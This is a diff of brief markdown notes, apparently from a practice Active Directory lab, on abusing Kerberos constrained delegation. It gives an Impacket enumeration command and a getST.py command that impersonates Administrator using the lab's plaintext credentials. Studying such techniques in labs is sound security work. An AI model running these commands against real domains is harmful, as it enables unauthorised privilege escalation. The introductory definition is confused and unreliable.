@@ -1,12 +1,21 @@
 **Constrained Delegation** is a security feature in Active Directory environments where an attacker targets specific services. It works by allowing a service to impersonate users, but only to access predefined services using their Kerberos tickets (TGS—Ticket Granting Service).
 
+### Enumeration
+
+#### Impacket
+
 ```bash
 findDelegation.py NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local
 ```
 
+
 ![[Pasted image 20240816142743.png]]
 
+#### Bloodhound
+
 ![[Pasted image 20240816150123.png]]
+
+### The Attack
 
 ```bash
 getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
